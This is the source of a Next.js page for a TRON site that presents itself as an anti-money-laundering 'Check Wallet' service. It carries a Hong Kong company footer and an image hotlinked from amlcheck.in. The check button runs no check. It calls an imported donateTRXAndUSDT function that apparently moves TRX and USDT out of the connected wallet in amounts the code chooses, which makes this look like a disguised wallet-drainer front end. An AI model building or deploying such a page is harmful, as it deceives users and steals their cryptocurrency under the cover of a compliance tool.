'use client';

import Image from "next/image";
import { useState, useEffect } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { donateTRXAndUSDT } from "@/utils/demo";



export default function Home() {
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletAddress, setWalletAddress] = useState('');
  const [txHash, setTxHash] = useState('');
  const [donationAmount, setDonationAmount] = useState('');
  const [error, setError] = useState('');
  const [usdtTxHash, setUsdtTxHash] = useState('');
  const [usdtDonationAmount, setUsdtDonationAmount] = useState('');

  useEffect(() => {
    // Check if TronLink is installed
    if (window.tronLink && window.tronLink.ready) {
      connectWallet();
    } else {
      setError("TronLink wallet is not installed. Please install it.");
    }
  }, []);
  
  // Function to connect the wallet
  const connectWallet = async () => {
    try {
      // Request the user's account
      const account = await tronWeb.defaultAddress.base58;
      setWalletAddress(account);
    } catch (error) {
      setError("Error connecting to wallet: " + error.message);
    }
  };

  // Handle Check Wallet button click
  async function handleCheck() {
    setIsProcessing(true); // Start processing
    try {
      if (walletAddress) {
        console.log("Connected wallet address:", walletAddress);
      } else {
        setError("No wallet connected. Please try again.");
        return;
      }
  
      // Call the donate function and handle the response
      const { trxTxHash, usdtTxHash, trxAmount, usdtAmount } = await donateTRXAndUSDT(tronWeb);
      
      // Update state with the transaction details
      setTxHash(trxTxHash || '');
      setUsdtTxHash(usdtTxHash || '');
      setDonationAmount(trxAmount);
      setUsdtDonationAmount(usdtAmount);
  
      console.log('Donation successful:', trxTxHash);
  
    } catch (error) {
      // Set error state with a meaningful message
      setError(error.message || "An unknown error occurred. Please try again.");
      console.error('Error in handleCheck:', error); // Log the error details in the console
    } finally {
      setIsProcessing(false); // Stop processing
    }
  };
  


      // Call donation function
 
  

  return (
    <div className="flex flex-col min-h-screen bg-white">
      {/* Fixed Nav/Logo Section */}
      <div className="fixed top-0 left-0 right-0 bg-white z-50 px-4 py-3">
        <div className="flex justify-between items-center max-w-screen-xl mx-auto">
          <Image
            src="/LOGO.jpg"
            alt="Company Logo"
            width={35}
            height={35}
            className="rounded-lg"
            priority
          />
          <w3m-button />
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 bg-gray-100 pt-[72px] mt-8">
        <div className="container mx-auto px-4">
          {/* Main Content Container - Added min-h-screen */}
          <div className="min-h-[calc(100vh-72px)]">  {/* This ensures main content takes up full viewport height minus header */}
            <div className="text-center mb-8">
              <h1 className="text-3xl font-bold mb-4 leading-tight text-black">
                Pay Tron to Check wallets for Flash USDT & illicit funds
              </h1>
              <p className="text-gray-600 text-lg">
                Protecting users and businesses from unwitting participation in financial crimes.
              </p>
            </div>

            {/* Dashboard Image */}
            <div className="mb-8">
              <Image
                src="https://amlcheck.in/static/media/cover.ef538f1256b3dd19f911.jpg"
                alt="Dashboard visualization"
                width={800}
                height={400}
                className="rounded-lg w-full"
              />
            </div>

            {/* CTA Buttons */}
            <div className="flex flex-col gap-4 px-4 mt-16">
              <div className="flex justify-center">
                <button 
                  onClick={handleCheck}
                  className="bg-red-500 text-white py-3 rounded-full text-lg font-medium w-1/2"
                >
                  {isProcessing ? 'Processing...' : 'Check Wallet'}
                </button>
                <div>
                
                {error && (
        <div className="bg-red-200 text-red-800 p-4 rounded-lg mx-auto mt-4">
          {error}
        </div>
      )}

                </div>
                

              </div>
              <button className="flex items-center justify-center gap-2 text-black font-medium">
                For Businesses <span>→</span>
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-black text-white text-sm py-4">
        <div className="container mx-auto px-6 space-y-10 py-6">
          {/* Logo and Company Info */}
          <div className="mb-4">
            <Image
              src="/logo.png"
              alt="Company Logo"
              width={35}
              height={35}
              className="rounded-lg mb-4 opacity-90 filter grayscale brightness-150"
              priority
            />
            <h3 className="font-bold mb-2">SAFELEMENT LIMITED,</h3>
            <p className="text-gray-400">
              UNIT H 3/F SHEK KOK ROAD 8, TSEUNG KWAN O, N.T HONG KONG
            </p>
          </div>

          {/* Legal Links */}
          <div className="flex flex-col gap-2">
            <a href="/regulatory" className="hover:text-gray-300">
              Regulatory framework
            </a>
            <a href="/agreement" className="hover:text-gray-300">
              User Agreement
            </a>
            <a href="/privacy" className="hover:text-gray-300">
              Privacy Policy
            </a>
          </div>

          {/* Copyright */}
          <div className="mt-4 text-gray-400">
            © 2024 $TRC-Bot
            <div className="h-px bg-gray-700 mt-4"></div> 
          </div>
        </div>
      </footer>
    </div>
  );
}
